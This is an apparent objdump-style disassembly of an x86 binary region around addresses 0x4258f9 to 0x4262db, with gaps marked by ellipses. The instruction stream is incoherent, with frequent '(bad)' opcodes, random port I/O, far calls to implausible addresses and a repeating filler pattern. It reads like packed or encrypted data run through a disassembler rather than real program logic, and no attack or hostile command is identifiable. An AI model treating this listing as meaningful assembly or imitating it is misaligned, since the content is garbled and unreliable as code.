  4258f9:	rcr    dh,cl
  4258fb:	pop    esi
  4258fc:	adc    BYTE PTR [edx+0x55],0x71
  425900:	iret   
  425901:	pop    ebx
  425902:	mov    ch,0x3f
  425904:	int3   
  425905:	nop
  425906:	add    DWORD PTR [eax],eax
  425908:	add    al,0x1
  42590a:	add    BYTE PTR [eax],al
  42590c:	cld    
  42590d:	xor    edx,DWORD PTR [edx]
  42590f:	imul   ecx,DWORD PTR [edi+0x371691c2],0x2b
  425916:	pop    ds
  425917:	sbb    ah,bl
  425919:	cs pop eax
  42591b:	fstp   QWORD PTR [ebx]
  42591d:	test   BYTE PTR [esi+0x60],dl
  425920:	mov    ds:0x387da288,eax
  425925:	call   0x5281b4d6
  42592a:	inc    edi
  42592b:	xor    dl,dl
  42592d:	dec    BYTE PTR [ecx]
  42592f:	jmp    0x5dee7e1e
  425934:	scas   al,BYTE PTR es:[edi]
  425935:	daa    
  425936:	jae    0x425967
  425938:	mov    ebx,0xc212fc6a
  42593d:	(bad)  
  42593e:	push   esp
  42593f:	push   0x307c1b39
  425944:	(bad)  
  425945:	loopne 0x4259b3
  425947:	add    ch,0x94
  42594a:	pop    eax
  42594b:	gs push 0xe2032e97
  425951:	cmp    eax,0x9c76f59f
  425956:	cs push edx
  425958:	push   esp
  425959:	in     al,dx
  42595a:	int    0xad
  42595c:	out    dx,al
  42595d:	daa    
  42595e:	push   eax
  42595f:	in     al,dx
  425960:	test   BYTE PTR [eax],0x86
  425963:	and    ecx,eax
  425965:	in     al,0x23
  425967:	out    dx,eax
  425968:	in     eax,0x6
  42596a:	mov    edi,0x5fc610c9
  42596f:	test   al,0xc7
  425971:	push   0xffffffcb
  425973:	add    dl,BYTE PTR [ecx+ebx*2+0x1fd0f187]
  42597a:	neg    BYTE PTR [ebx+ebx*1]
  42597d:	lahf   
  42597e:	push   ds
  42597f:	shl    ch,1
  425981:	pop    esp
  425982:	add    bl,BYTE PTR gs:[eax]
  425985:	add    al,0x7b
  425987:	adc    BYTE PTR [ebp+0x61],ch
  42598a:	mov    ah,0x6f
  42598c:	repnz cld 
  42598e:	imul   BYTE PTR [edx-0x64a606d5]
  425994:	cmp    bl,BYTE PTR [ebp+0x340d94b8]
  42599a:	push   ecx
  42599b:	push   ss
  42599c:	test   ebp,ebx
  42599e:	cmp    eax,edx
  4259a0:	push   eax
  4259a1:	in     eax,dx
  4259a2:	div    dl
  4259a4:	mov    bl,0xf5
  4259a6:	pop    ebp
  4259a7:	mov    eax,0x81cc9289
  4259ac:	imul   edi,DWORD PTR [ecx+0x16],0xffffff99
  4259b0:	(bad)  
  4259b2:	add    al,0x94
  4259b4:	sbb    BYTE PTR [ecx-0x65],al
  4259b7:	loope  0x425982
  4259b9:	cmp    BYTE PTR [ebx+0xc],0x23
  4259bd:	out    dx,al
  4259be:	dec    esi
  4259bf:	xchg   BYTE PTR [ebx+ecx*1-0x3d3f26e3],bh
  4259c6:	add    DWORD PTR [ebp-0x66],esp
  4259c9:	push   ebx
  4259ca:	stc    
  4259cb:	fs jo  0x425a3a
  4259ce:	inc    edx
  4259cf:	iret   
  4259d0:	stos   DWORD PTR es:[edi],eax
  4259d1:	mov    ds:0x27e73cca,al
  4259d6:	push   esi
  4259d7:	gs repnz adc al,al
  4259db:	adc    eax,0xf20b90bb
  4259e0:	jae    0x4259eb
  4259e2:	add    esi,DWORD PTR [eax]
  4259e4:	cmp    eax,0xb85e4241
  4259e9:	push   ebx
  4259ea:	ds cmc 
  4259ec:	sbb    BYTE PTR [ebp-0x5b],0xf5
  4259f0:	mov    ebx,0x764bfa40
  4259f5:	clc    
  4259f6:	adc    bl,BYTE PTR [eax-0xa]
  4259f9:	fmul   DWORD PTR [ebp+0x18]
  4259fc:	mov    ecx,0x5f188f65
  425a01:	out    dx,eax
  425a02:	gs jmp 0x1e30ab16
  425a08:	add    edi,ecx
  425a0a:	rol    DWORD PTR [eax+eax*1],1
  425a0d:	ins    DWORD PTR es:[edi],dx
  425a0e:	shr    BYTE PTR [ecx+0x0],cl
	...
  425a71:	add    BYTE PTR [eax],al
  425a73:	add    cl,al
  425a75:	arpl   WORD PTR [edi+eiz*2],ax
  425a78:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425a79:	jcxz   0x425a63
  425a7c:	(bad)  
  425a7d:	fimul  DWORD PTR [edi+eax*4+0x9487cd3]
  425a84:	rcl    BYTE PTR [ecx+0x1040001],1
  425a8a:	add    BYTE PTR [eax],al
  425a8c:	pop    es
  425a8d:	inc    esi
  425a8e:	pop    es
  425a8f:	mul    edx
  425a91:	lea    ebx,[edx-0x787af85]
  425a97:	in     eax,dx
  425a98:	xor    al,0x26
  425a9a:	mov    BYTE PTR [ecx+eax*4+0x91a64a9],bl
  425aa1:	dec    ebx
  425aa2:	scas   eax,DWORD PTR es:[edi]
  425aa3:	aam    0x79
  425aa5:	stc    
  425aa6:	push   es
  425aa7:	mov    cl,0x31
  425aa9:	or     esp,DWORD PTR [edi-0x4f0cbce]
  425aaf:	inc    eax
  425ab0:	sub    ebx,DWORD PTR [eax]
  425ab2:	(bad)  
  425ab3:	push   ss
  425ab4:	mov    esp,0xea3c33f
  425ab9:	pop    esi
  425aba:	xlat   BYTE PTR ds:[ebx]
  425abb:	lods   eax,DWORD PTR ds:[esi]
  425abc:	je     0x425afe
  425abe:	rcl    dl,0x5
  425ac1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425ac2:	outs   dx,BYTE PTR ds:[esi]
  425ac3:	jno    0x425b32
  425ac5:	dec    esi
  425ac6:	or     BYTE PTR [ecx],bh
  425ac8:	stos   DWORD PTR es:[edi],eax
  425ac9:	test   al,0x73
  425acb:	in     eax,0x28
  425acd:	pushf  
  425ace:	jmp    DWORD PTR [eax+edi*2-0xad210b0]
  425ad5:	ins    DWORD PTR es:[di],dx
  425ad7:	mov    edi,DWORD PTR [esp+esi*8+0x7bd37767]
  425ade:	mov    eax,0x34ff4b32
  425ae3:	hlt    
  425ae4:	sub    BYTE PTR [esp+ebp*8+0x28],cl
  425ae8:	int3   
  425ae9:	lahf   
  425aea:	inc    edx
  425aeb:	hlt    
  425aec:	push   eax
  425aed:	adc    eax,0xcc27eb77
  425af2:	inc    edx
  425af3:	ja     0x425b4e
  425af5:	or     eax,0x723dfa20
  425afa:	push   ds
  425afb:	lods   eax,DWORD PTR ds:[esi]
  425afc:	leave  
  425afd:	outs   dx,DWORD PTR ds:[esi]
  425afe:	cmp    eax,0xe68ab9ab
  425b03:	hlt    
  425b04:	push   esp
  425b05:	lods   al,BYTE PTR ds:[esi]
  425b06:	cli    
  425b07:	mov    edx,0x1ed22d65
  425b0c:	xor    eax,0xc87ab78
  425b11:	(bad)  [edx+edi*1]
  425b14:	bound  esi,QWORD PTR [esi]
  425b16:	(bad)  
  425b17:	out    dx,al
  425b18:	iret   
  425b19:	xor    al,0x68
  425b1b:	pop    es
  425b1c:	and    BYTE PTR [edi-0xc],bl
  425b1f:	cmc    
  425b20:	jb     0x425aca
  425b22:	cmp    BYTE PTR [edi-0x3202af9d],dl
  425b28:	xchg   esi,eax
  425b29:	or     edi,DWORD PTR [ebx+0x3]
  425b2c:	mov    esp,esp
  425b2e:	aad    0x3f
  425b30:	sbb    al,0x5c
  425b32:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425b33:	cmp    al,0x7e
  425b35:	imul   BYTE PTR [eax]
  425b37:	push   0xbf8af2b7
  425b3c:	fcom   QWORD PTR [edx+0x41a6bfd4]
  425b42:	push   cs
  425b43:	adc    ecx,DWORD PTR [edi+0x3c8cf668]
  425b49:	push   ebx
  425b4a:	pop    ss
  425b4b:	mov    ds:0xe5d07a97,al
  425b50:	dec    edx
  425b51:	inc    edx
  425b52:	div    DWORD PTR [esi-0x4d]
  425b55:	or     al,0xc4
  425b57:	or     eax,eax
  425b59:	fwait
  425b5a:	pop    esi
  425b5b:	mov    edi,esi
  425b5d:	mov    ds:0xaf1985cb,al
  425b62:	test   BYTE PTR [ecx],ah
  425b64:	pusha  
  425b65:	ror    DWORD PTR ds:0x2abb4ebe,0x5e
  425b6c:	loope  0x425b9c
  425b6e:	xchg   DWORD PTR [ebp+0x0],edx
  425b71:	cmp    eax,DWORD PTR [eax]
  425b73:	call   0xd39:0x1f5ee907
  425b7a:	push   edi
  425b7b:	call   0x66c9713c
  425b80:	pushf  
  425b81:	mov    edi,0xb84b7402
  425b86:	nop
  425b87:	jns    0x425b30
  425b89:	pushf  
  425b8a:	test   al,0xaa
  425b8c:	mov    bh,BYTE PTR ds:0xb433
	...
  425bf2:	add    BYTE PTR [eax],al
  425bf4:	(bad)  
  425bf5:	clc    
  425bf6:	jnp    0x425c4e
  425bf8:	jg     0x425bd1
  425bfa:	in     eax,dx
  425bfb:	cli    
  425bfc:	enter  0xe6cd,0x96
  425c00:	inc    edx
  425c01:	jo     0x425c07
  425c03:	xor    dl,ah
  425c05:	xchg   edx,eax
  425c06:	add    DWORD PTR [eax],eax
  425c08:	add    al,0x1
  425c0a:	add    BYTE PTR [eax],al
  425c0c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425c0d:	loopne 0x425bf6
  425c0f:	inc    esi
  425c10:	je     0x425ba0
  425c12:	xor    DWORD PTR [ecx-0x56],0xffffffe2
  425c16:	out    0xa1,eax
  425c18:	test   DWORD PTR [ebx*2-0x7ff18baa],ebp
  425c1f:	mov    ah,0x3e
  425c21:	xchg   ebp,eax
  425c22:	mov    ah,0xd9
  425c24:	mov    eax,ds:0x93c4ed8a
  425c29:	adc    bl,BYTE PTR [ebx*1+0x56af3519]
  425c30:	dec    ebp
  425c31:	sysexit 
  425c33:	or     edx,esp
  425c35:	leave  
  425c36:	stos   BYTE PTR es:[edi],al
  425c37:	lds    edx,FWORD PTR ds:0x1477969a
  425c3d:	sub    eax,0xe670b2d4
  425c42:	mov    bl,0x52
  425c44:	pusha  
  425c45:	pop    edi
  425c46:	rol    DWORD PTR [ebp*1+0x635edb54],cl
  425c4d:	cmp    cl,dh
  425c4f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425c50:	pop    edx
  425c51:	bound  esi,QWORD PTR [ecx-0x7]
  425c54:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425c55:	push   ebx
  425c56:	aaa    
  425c57:	mov    dl,0x74
  425c59:	pusha  
  425c5a:	outs   dx,DWORD PTR ds:[esi]
  425c5b:	sbb    edi,DWORD PTR [ebp+0x2ff73e4f]
  425c61:	sub    dh,BYTE PTR [ebp-0x354853c7]
  425c67:	gs pop esi
  425c69:	and    al,0x76
  425c6b:	inc    esp
  425c6c:	mov    bl,0xa2
  425c6e:	dec    eax
  425c6f:	and    BYTE PTR [edi],0x19
  425c72:	mov    ch,0xbc
  425c74:	lods   al,BYTE PTR ds:[esi]
  425c75:	test   al,0xac
  425c77:	in     eax,dx
  425c78:	and    DWORD PTR es:[edx+esi*1-0x77b40dac],edx
  425c80:	arpl   WORD PTR [edx+0x66],sp
  425c83:	out    0xfe,eax
  425c85:	xor    dh,BYTE PTR [ebx-0x66]
  425c88:	mov    dh,BYTE PTR [edx]
  425c8a:	daa    
  425c8b:	(bad)  
  425c8d:	jge    0x425ca1
  425c8f:	loop   0x425c27
  425c91:	dec    esp
  425c92:	sbb    BYTE PTR gs:0xc52f7b52,cl
  425c99:	ins    BYTE PTR es:[edi],dx
  425c9a:	inc    esp
  425c9b:	sahf   
  425c9c:	not    ch
  425c9e:	call   0xf0d952b7
  425ca3:	sub    edi,DWORD PTR ds:0xe4f4596f
  425ca9:	popa   
  425caa:	shr    DWORD PTR [ebp-0x64],cl
  425cad:	push   esi
  425cae:	or     eax,0xa5c44413
  425cb3:	cmp    dh,bl
  425cb5:	jle    0x425cbb
  425cb7:	mov    esp,0x6ffb7a46
  425cbc:	mov    eax,0x4c9ffee7
  425cc1:	cmpps  xmm3,XMMWORD PTR [eax-0xb1200b3],0x3b
  425cc9:	lds    ecx,FWORD PTR [ebx+ecx*4-0x6670c2ad]
  425cd0:	push   edx
  425cd1:	mov    eax,0x815db7ea
  425cd6:	cs ds xor eax,0x6739ecf3
  425cdd:	sub    DWORD PTR [ebx+0x5a],eax
  425ce0:	mov    bl,0x80
  425ce2:	das    
  425ce3:	mov    al,ds:0x98a82517
  425ce8:	test   al,0xe4
  425cea:	push   esi
  425ceb:	and    al,0xd6
  425ced:	pop    esp
  425cee:	xor    al,0x84
  425cf0:	mov    ecx,0x78634651
  425cf5:	push   esi
  425cf6:	shr    ah,1
  425cf8:	jae    0x425d74
  425cfa:	jp     0x425ce3
  425cfc:	pop    edi
  425cfd:	jbe    0x425cab
  425cff:	cdq    
  425d00:	mov    ds:0xab523b55,al
  425d05:	adc    edi,DWORD PTR [ecx+0x7478d1dd]
  425d0b:	ins    DWORD PTR es:[edi],dx
  425d0c:	hlt    
  425d0d:	mov    DWORD PTR [ebx+0xcc],ecx
	...
  425d73:	add    bh,bh
  425d75:	lods   al,BYTE PTR ds:[esi]
  425d76:	fadd   QWORD PTR [edi]
  425d78:	fbstp  TBYTE PTR [edi-0x1]
  425d7b:	cld    
  425d7c:	gs addr16 stc 
  425d7f:	mov    ds:0x2200f28b,al
  425d84:	fcom   DWORD PTR [ebx+0x1040001]
  425d8a:	add    BYTE PTR [eax],al
  425d8c:	pop    ds
  425d8d:	sbb    DWORD PTR [ebx-0x1e83ae],esp
  425d93:	test   BYTE PTR [ebx+0x2c],dl
  425d96:	add    al,0x6a
  425d98:	lock or eax,0x84ea64ce
  425d9e:	imul   DWORD PTR [ebp+0x45fddb1b]
  425da4:	mov    ds:0xfbd8f3f8,al
  425da9:	push   ss
  425daa:	loopne 0x425db6
  425dac:	or     al,0xa4
  425dae:	mov    ebx,0x76d70fe1
  425db3:	cmp    edx,edx
  425db5:	ins    DWORD PTR es:[edi],dx
  425db6:	stc    
  425db7:	mov    dl,0xcf
  425db9:	push   ebx
  425dba:	mov    eax,ds:0xb280b4ec
  425dbf:	inc    edi
  425dc0:	mov    esi,0x3c44c6a9
  425dc5:	adc    ebp,DWORD PTR [esi+0x7d9f97d2]
  425dcb:	jnp    0x425dd8
  425dcd:	sbb    BYTE PTR [eax],bh
  425dcf:	fs retf 
  425dd1:	fmul   QWORD PTR [bp+si+0x5390]
  425dd6:	push   0xb88565ce
  425ddb:	pop    di
  425ddd:	shl    BYTE PTR [esi-0x44],0x38
  425de1:	cmp    BYTE PTR [ecx-0x33],cl
  425de4:	jg     0x425de7
  425de6:	add    al,0xf2
  425de8:	in     al,0xa
  425dea:	xchg   ecx,eax
  425deb:	std    
  425dec:	ficom  DWORD PTR [ecx+0x73423ad2]
  425df2:	ror    DWORD PTR [ebx],cl
  425df4:	inc    ebp
  425df5:	xor    al,0xc
  425df7:	mov    ch,0xa8
  425df9:	push   0xfffffff6
  425dfb:	icebp  
  425dfc:	mov    cl,0x79
  425dfe:	stc    
  425dff:	xchg   ebx,eax
  425e00:	xlat   BYTE PTR ds:[ebx]
  425e01:	lods   al,BYTE PTR ds:[esi]
  425e02:	ja     0x425e5e
  425e04:	repz mov al,ds:0x11604a65
  425e0a:	bound  ebp,QWORD PTR [esp+eax*1+0x7]
  425e0e:	jbe    0x425e3d
  425e10:	push   ss
  425e11:	lock or cl,bl
  425e14:	inc    ecx
  425e15:	or     edx,DWORD PTR [ebp+0x58ea9697]
  425e1b:	xor    BYTE PTR [ebx+ecx*1-0x5b],dl
  425e1f:	popa   
  425e20:	stos   DWORD PTR es:[edi],eax
  425e21:	mov    bh,0x2
  425e23:	inc    ebx
  425e24:	mov    eax,ds:0xf462ad4a
  425e29:	lds    esi,FWORD PTR [edx-0x59]
  425e2c:	mov    dl,0xa5
  425e2e:	gs cmp esp,ecx
  425e31:	sub    al,0xb6
  425e33:	or     edi,DWORD PTR [ebp-0x1]
  425e36:	sub    BYTE PTR [eax+0x76],cl
  425e39:	ins    DWORD PTR es:[edi],dx
  425e3a:	inc    edi
  425e3b:	fs inc edi
  425e3d:	pop    edi
  425e3e:	pop    ss
  425e3f:	fiadd  WORD PTR [ebp-0x54]
  425e42:	call   0x62e3:0x8020182b
  425e49:	cmp    eax,DWORD PTR [esi-0xb]
  425e4c:	sar    ebp,1
  425e4e:	mov    bl,0x98
  425e50:	push   eax
  425e51:	lahf   
  425e52:	mov    bh,0xd7
  425e54:	cmp    eax,0x4c0ae7f9
  425e59:	push   cs
  425e5a:	aas    
  425e5b:	ins    DWORD PTR es:[edi],dx
  425e5c:	aaa    
  425e5d:	cmp    eax,0x73895b2a
  425e62:	dec    esp
  425e63:	push   0x4c59ba2c
  425e68:	add    al,0x78
  425e6a:	inc    ecx
  425e6b:	stos   BYTE PTR es:[edi],al
  425e6c:	aaa    
  425e6d:	xor    ebx,DWORD PTR [edi+0x135c010c]
  425e73:	or     al,0xcf
  425e75:	mov    DWORD PTR [esi-0x53b6ca0b],esi
  425e7b:	add    eax,0x78d9e8c
  425e80:	(bad)  
  425e81:	(bad)  
  425e83:	imul   edi,DWORD PTR [edi+ebx*8-0x3b4a68b9],0x95c6825c
  425e8e:	stos   DWORD PTR es:[edi],eax
  425e8f:	inc    ebx
	...
  425ef4:	(bad)  
  425ef5:	jl     0x425f48
  425ef7:	sar    bl,1
  425ef9:	std    
  425efa:	(bad)  
  425efb:	jle    0x425ec9
  425efd:	pop    ss
  425efe:	popf   
  425eff:	scas   eax,DWORD PTR es:[edi]
  425f00:	fldcw  WORD PTR [edi-0x34]
  425f03:	sbb    esp,0xffffff94
  425f06:	add    DWORD PTR [eax],eax
  425f08:	add    al,0x1
  425f0a:	add    BYTE PTR [eax],al
  425f0c:	cmp    DWORD PTR [ecx+0x24],ebp
  425f0f:	cmp    ch,bh
  425f11:	scas   eax,DWORD PTR es:[edi]
  425f12:	ror    BYTE PTR [ebx],0xb0
  425f15:	not    DWORD PTR [esi+esi*8]
  425f18:	lods   eax,DWORD PTR ds:[esi]
  425f19:	fadd   QWORD PTR [eax]
  425f1b:	push   ebx
  425f1c:	sub    ebx,esi
  425f1e:	mov    ecx,0xa354ea7c
  425f23:	out    dx,eax
  425f24:	mov    cs,WORD PTR [ecx+0x9]
  425f27:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425f28:	cmp    ebx,edx
  425f2a:	out    0x48,ax
  425f2d:	lods   al,BYTE PTR ds:[esi]
  425f2e:	xchg   ebp,eax
  425f2f:	push   edx
  425f30:	fldenv [esp+esi*1]
  425f33:	xchg   esp,eax
  425f34:	sub    dh,dh
  425f36:	or     eax,0xaae4fe16
  425f3b:	in     eax,0x38
  425f3d:	rol    BYTE PTR [ebp+0x27],0x4
  425f41:	cld    
  425f42:	mov    ch,bl
  425f44:	pop    es
  425f45:	stc    
  425f46:	mov    edx,0x6aa898d6
  425f4b:	push   0xffffff82
  425f4d:	and    BYTE PTR [edi+0x12],dh
  425f50:	test   BYTE PTR [ecx],0xb5
  425f53:	sbb    eax,0x98e3c01e
  425f58:	push   ebp
  425f59:	sar    esp,0x92
  425f5c:	pop    ecx
  425f5d:	int3   
  425f5e:	aaa    
  425f5f:	push   ss
  425f60:	ss xchg ch,ch
  425f63:	adc    eax,esp
  425f65:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425f66:	aas    
  425f67:	imul   esi
  425f69:	das    
  425f6a:	push   ebx
  425f6b:	hlt    
  425f6c:	rcr    DWORD PTR [ebp-0x7a],1
  425f6f:	stos   DWORD PTR es:[edi],eax
  425f70:	mov    edx,0xb506acb4
  425f75:	push   es
  425f76:	xor    al,0x70
  425f78:	and    bl,cl
  425f7a:	mov    al,ds:0x1699bcae
  425f7f:	jle    0x425f4e
  425f81:	dec    ecx
  425f82:	mov    ebp,0xb625632c
  425f87:	dec    esi
  425f88:	and    bl,ch
  425f8a:	(bad)  
  425f8b:	fmul   QWORD PTR [eax]
  425f8d:	add    DWORD PTR [edi+0x51],edx
  425f90:	int    0xd8
  425f92:	aaa    
  425f93:	or     DWORD PTR [ebp+0x7d8b68f3],0xcca70dcd
  425f9d:	pop    ebp
  425f9f:	rcr    BYTE PTR [edx],cl
  425fa1:	dec    ebp
  425fa2:	into   
  425fa3:	xchg   esi,eax
  425fa4:	fistp  QWORD PTR [edi-0x362aa606]
  425faa:	dec    ebp
  425fab:	aam    0x43
  425fad:	lea    edx,[eax+0x40]
  425fb0:	pop    ebx
  425fb1:	sbb    dh,dh
  425fb3:	mov    esi,ebp
  425fb5:	inc    edi
  425fb6:	frstor [esi-0x44]
  425fb9:	adc    edi,ebp
  425fbb:	sbb    al,0xa5
  425fbd:	mov    BYTE PTR [ebx-0x39],0xa8
  425fc1:	xor    BYTE PTR ds:0xc756763e,cl
  425fc7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425fc8:	add    DWORD PTR [eax],ebx
  425fca:	popf   
  425fcb:	stc    
  425fcc:	mov    bl,0x47
  425fce:	ret    
  425fcf:	out    0x6b,al
  425fd1:	not    BYTE PTR [edi]
  425fd3:	call   FWORD PTR [edx]
  425fd5:	inc    edi
  425fd6:	in     eax,0xf0
  425fd8:	dec    eax
  425fd9:	or     al,0xe5
  425fdb:	mov    eax,ds:0x273b44f
  425fe0:	push   ebp
  425fe1:	jnp    0x426042
  425fe3:	jmp    0x640e:0xbcdb976c
  425fea:	jno    0x425fe9
  425fec:	aas    
  425fed:	push   ss
  425fee:	iret   
  425fef:	arpl   WORD PTR [esi],ax
  425ff1:	cmp    eax,0x4f7e5d8d
  425ff6:	jns    0x425f7c
  425ff8:	mov    ecx,0xc2d639e
  425ffd:	xchg   esp,eax
  425ffe:	lock into 
  426000:	je     0x425fa5
  426002:	out    dx,eax
  426003:	cmp    esp,DWORD PTR [ecx+eax*8-0x18]
  426007:	les    eax,FWORD PTR ds:[ebp-0x74]
  42600b:	aad    0x7c
  42600d:	(bad)  
  42600e:	mov    dl,0x95
	...
  426074:	cmp    DWORD PTR [eax-0x6854f9f5],ebx
  42607a:	cmp    eax,0x304575bf
  42607f:	in     al,dx
  426080:	add    eax,0xe0d9e5ce
  426085:	xchg   ebp,eax
  426086:	add    DWORD PTR [eax],eax
  426088:	add    al,0x1
  42608a:	add    BYTE PTR [eax],al
  42608c:	sbb    ah,bh
  42608e:	stos   BYTE PTR es:[edi],al
  42608f:	sar    edi,cl
  426091:	mov    ebp,0xc021c2f9
  426096:	test   eax,0xd7b084a4
  42609b:	fisubr WORD PTR [edx]
  42609d:	stos   BYTE PTR es:[edi],al
  42609e:	pop    ebp
  42609f:	cmp    BYTE PTR [edx+0x740e76e4],0x86
  4260a6:	es push esp
  4260a8:	das    
  4260a9:	mov    ds:0xf7be8bcc,eax
  4260ae:	les    eax,FWORD PTR [esi+ebx*8]
  4260b1:	les    esp,FWORD PTR [ecx+0x61]
  4260b4:	pop    ecx
  4260b5:	xor    DWORD PTR [ebp-0x2d8ee89b],ecx
  4260bb:	mov    ecx,0x50339efa
  4260c0:	je     0x426068
  4260c2:	pop    ds
  4260c3:	lea    esp,[edx]
  4260c5:	sbb    eax,DWORD PTR [esi+0x36ddde9e]
  4260cb:	ins    BYTE PTR es:[edi],dx
  4260cc:	(bad)  
  4260ce:	ret    0xafc5
  4260d1:	or     ecx,DWORD PTR [eax+ecx*8+0x13]
  4260d5:	(bad)  
  4260d6:	cmp    esp,DWORD PTR [ecx]
  4260d8:	les    eax,FWORD PTR [edi+edx*2-0x1ed55f59]
  4260df:	mov    al,0x68
  4260e1:	icebp  
  4260e2:	jbe    0x42615c
  4260e4:	jnp    0x426131
  4260e6:	pop    esp
  4260e7:	mov    BYTE PTR [ecx],dl
  4260e9:	dec    eax
  4260ea:	inc    esi
  4260eb:	push   eax
  4260ec:	adc    DWORD PTR [ebp+0x853d9d7],ecx
  4260f2:	leave  
  4260f3:	sub    DWORD PTR [esi-0x57943d70],ebp
  4260f9:	cdq    
  4260fa:	test   DWORD PTR [eax],ebp
  4260fc:	mov    edi,0x7f9350a8
  426101:	dec    edi
  426102:	xor    al,0x38
  426104:	jl     0x426181
  426106:	cmp    bh,ch
  426108:	hlt    
  426109:	ret    
  42610a:	int3   
  42610b:	in     eax,0x47
  42610d:	add    ebp,DWORD PTR [edx+0x459d3253]
  426113:	ret    0xb002
  426116:	push   esp
  426117:	push   cs
  426118:	jle    0x4260d5
  42611a:	sub    eax,0x86026a6d
  42611f:	push   ss
  426120:	mov    DWORD PTR [edi-0xa],edx
  426123:	mov    DWORD PTR [ebx+0x785bd5ce],edi
  426129:	jge    0x4261a7
  42612b:	shr    BYTE PTR [edi-0x2db65583],cl
  426131:	mov    edi,0xd9eab938
  426136:	jo     0x426176
  426138:	fnstenv [esi+0x23]
  42613b:	sahf   
  42613c:	pop    ebp
  42613d:	call   0xb7d47153
  426142:	pop    edi
  426143:	pop    ebx
  426144:	mov    ecx,DWORD PTR [ecx-0x2d843bcf]
  42614a:	or     al,0xcd
  42614c:	inc    ecx
  42614d:	lock xchg ecx,eax
  42614f:	mov    eax,ecx
  426151:	sbb    BYTE PTR [ebp+0x58487a6f],cl
  426157:	push   ebp
  426158:	push   cs
  426159:	loopne 0x426144
  42615b:	test   ch,0x89
  42615e:	icebp  
  42615f:	ins    DWORD PTR es:[edi],dx
  426160:	cdq    
  426161:	lea    ebp,[ebx-0xa8109d3]
  426167:	xchg   ebx,eax
  426168:	neg    dl
  42616a:	push   ecx
  42616b:	out    0x19,eax
  42616d:	cdq    
  42616e:	ret    0xfaff
  426171:	and    dl,BYTE PTR ds:0x7b04e1f5
  426177:	adc    BYTE PTR [esi],dh
  426179:	mov    BYTE PTR [esi],ah
  42617b:	into   
  42617c:	mov    bl,0xcf
  42617e:	adc    ch,ah
  426180:	ret    
  426181:	ins    BYTE PTR es:[edi],dx
  426182:	push   ss
  426183:	jnp    0x42615b
  426185:	jl     0x426202
  426187:	retf   
  426188:	jl     0x42613a
  42618a:	dec    edx
  42618b:	sbb    al,0x31
  42618d:	cmp    DWORD PTR [ebp+0x39],eax
	...
  4261f4:	fwait
  4261f5:	and    DWORD PTR [edi],ecx
  4261f7:	popa   
  4261f8:	mov    edi,0xb7fbff6f
  4261fd:	xor    DWORD PTR [ecx+0x5f43027],0x4f
  426204:	in     al,0x96
  426206:	add    DWORD PTR [eax],eax
  426208:	add    al,0x1
  42620a:	add    BYTE PTR [eax],al
  42620c:	push   eax
  42620d:	inc    esi
  42620e:	adc    ebx,DWORD PTR [esi+0x7e]
  426211:	mov    ds:0x43f2fc9f,eax
  426216:	stos   BYTE PTR es:[edi],al
  426217:	adc    esp,DWORD PTR [ebx-0xa]
  42621a:	mov    al,ds:0xda4383c9
  42621f:	(bad)  
  426220:	cdq    
  426221:	cmp    DWORD PTR [edi-0x6],ecx
  426224:	js     0x4261c5
  426226:	dec    edi
  426227:	inc    ecx
  426228:	test   eax,0x67486bde
  42622d:	ret    0x3cf1
  426230:	lock cdq 
  426232:	addr16 jns 0x4261b9
  426235:	push   esi
  426236:	icebp  
  426237:	cli    
  426238:	sub    al,BYTE PTR [ecx+0x2]
  42623b:	adc    edx,DWORD PTR [edi+0x28]
  42623e:	add    ebx,ecx
  426240:	cmp    DWORD PTR [ebx+0xe],0x62
  426244:	je     0x4261db
  426246:	imul   ebx,DWORD PTR [edx-0x1],0xffffff85
  42624a:	adc    al,0xce
  42624c:	xchg   esp,eax
  42624d:	jbe    0x426219
  42624f:	sub    edx,ebx
  426251:	loop   0x4261d5
  426253:	dec    ebx
  426254:	lods   al,BYTE PTR ds:[esi]
  426255:	cmp    al,0xb5
  426257:	scas   eax,DWORD PTR es:[edi]
  426258:	(bad)
  42625b:	out    0x38,eax
  42625d:	imul   edx,DWORD PTR [ebp+0x46],0xfffffff6
  426261:	or     DWORD PTR [ecx],edi
  426263:	hlt    
  426264:	and    eax,0x80bfe62c
  426269:	leave  
  42626a:	popa   
  42626b:	fs inc eax
  42626d:	xor    al,0x1f
  42626f:	mov    ecx,es
  426271:	into   
  426272:	cmp    DWORD PTR [edi+0x6],esp
  426275:	fistp  WORD PTR [ecx]
  426277:	mov    ds:0x10d710fe,eax
  42627c:	inc    esi
  42627d:	popf   
  42627e:	and    eax,0x593e4100
  426283:	(bad)  
  426284:	cmp    BYTE PTR [ebx-0x5b3a5a69],ch
  42628a:	push   edi
  42628b:	outs   dx,DWORD PTR ds:[esi]
  42628c:	bound  ebx,QWORD PTR ds:0x39dd6e79
  426292:	in     eax,dx
  426293:	stos   DWORD PTR es:[edi],eax
  426294:	lods   eax,DWORD PTR ds:[esi]
  426295:	cli    
  426296:	cmp    BYTE PTR [esi],dh
  426298:	pop    ebp
  426299:	mov    ?,WORD PTR [edx+0x75]
  42629c:	cmc    
  42629d:	jns    0x4262c0
  42629f:	inc    esi
  4262a0:	mov    esp,DWORD PTR [ecx-0x1fa58661]
  4262a6:	and    esi,ebp
  4262a8:	in     eax,dx
  4262a9:	jno    0x4262af
  4262ab:	daa    
  4262ac:	xchg   esi,eax
  4262ad:	add    eax,0x32c2f036
  4262b2:	push   0xffffffb6
  4262b4:	ss cld 
  4262b6:	dec    ecx
  4262b7:	push   ebp
  4262b8:	xchg   ebp,eax
  4262b9:	aam    0xd6
  4262bb:	ret    0x895d
  4262be:	imul   esi,ebp,0xffffffaf
  4262c1:	sti    
  4262c2:	xchg   ebp,eax
  4262c3:	in     eax,dx
  4262c4:	pop    eax
  4262c5:	pop    ecx
  4262c6:	das    
  4262c7:	ss fwait
  4262c9:	leave  
  4262ca:	or     eax,0xa1289ad1
  4262cf:	jbe    0x426331
  4262d1:	pushf  
  4262d2:	ja     0x42628e
  4262d4:	retf   
  4262d5:	add    DWORD PTR [edx-0x4857943e],edi
  4262db:	or     BYTE PTR [ebx],dl
